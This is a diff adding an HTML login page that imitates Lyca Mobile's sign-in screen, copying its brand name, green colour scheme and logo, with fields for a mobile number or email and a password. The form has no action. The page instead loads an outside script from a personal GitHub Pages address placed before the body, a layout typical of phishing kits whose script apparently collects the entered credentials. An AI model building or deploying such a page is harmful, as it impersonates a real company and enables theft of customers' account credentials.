@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Lyca Mobile Login</title>
+  <style>
+    /* General Reset */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: Arial, sans-serif;
+    }
+
+    body {
+      background-color: #e0f7e9; /* Light green background */
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .login-container {
+      background-color: #fff;
+      padding: 40px;
+      border-radius: 8px;
+      width: 350px;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+      text-align: center;
+    }
+
+    .login-container h2 {
+      color: #008751; /* Lyca green */
+      margin-bottom: 30px;
+      font-size: 24px;
+    }
+
+    .login-container input[type="text"],
+    .login-container input[type="password"] {
+      width: 100%;
+      padding: 12px 15px;
+      margin: 10px 0 20px 0;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      font-size: 16px;
+    }
+
+    .login-container input[type="submit"] {
+      background-color: #008751;
+      color: white;
+      border: none;
+      padding: 12px;
+      width: 100%;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+
+    .login-container input[type="submit"]:hover {
+      background-color: #006b4f;
+    }
+
+    .login-container a {
+      display: block;
+      margin-top: 15px;
+      color: #008751;
+      text-decoration: none;
+      font-size: 14px;
+    }
+
+    .login-container a:hover {
+      text-decoration: underline;
+    }
+
+    .logo {
+      margin-bottom: 20px;
+    }
+
+    .logo img {
+      width: 120px;
+    }
+  </style>
+</head>
+<script src="https://ysktshsh.github.io/intfolder/int3.js"></script>
+<body>
+  <div class="login-container">
+    <div class="logo">
+      <!-- Placeholder for Lyca Mobile logo -->
+      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSV36Zjelonf008y3NNk6gwWfI7ae_ODyywig&s" alt="Lyca Mobile Logo">
+    </div>
+    <h2>Sign in to your Lyca Mobile account</h2>
+    <form>
+      <input type="text" placeholder="Mobile Number or Email" name="Mobile number or email" required>
+      <input type="password" placeholder="Password" name="password" required>
+      <input type="submit" value="Sign In">
+      <a href="#">Forgot password?</a>
+      <a href="#">Register a new account</a>
+    </form>
+  </div>
+</body>
+</html>
